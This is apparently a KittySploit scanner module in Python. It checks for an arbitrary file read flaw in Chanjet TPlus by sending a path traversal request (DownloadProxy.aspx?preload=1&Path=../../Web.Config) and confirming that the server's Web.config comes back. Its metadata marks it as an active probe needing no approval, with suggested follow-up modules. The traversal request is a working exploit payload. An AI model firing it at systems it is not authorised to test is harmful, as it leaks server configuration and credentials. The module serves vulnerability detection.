#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Chanjet TPlus DownloadProxy."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Chanjet TPlus DownloadProxy.aspx - Arbitrary File Read Detection',
        'description': 'Chanjet TPlus DownloadProxy.aspx file has an arbitrary file reading vulnerability. An attacker can obtain sensitive files on the server through the vulnerability.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'yonyou', 'chanjet', 'lfi', 'tplus', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/webapp/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B%20%E7%95%85%E6%8D%B7%E9%80%9AT%2B%20DownloadProxy.aspx%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('xml version', '<configuration>',)
        header_any = ('application/octet-stream',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='high',
                reason="Chanjet TPlus DownloadProxy.aspx - Arbitrary File Read detected",
                path='/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config',
            )
            return True
        return False

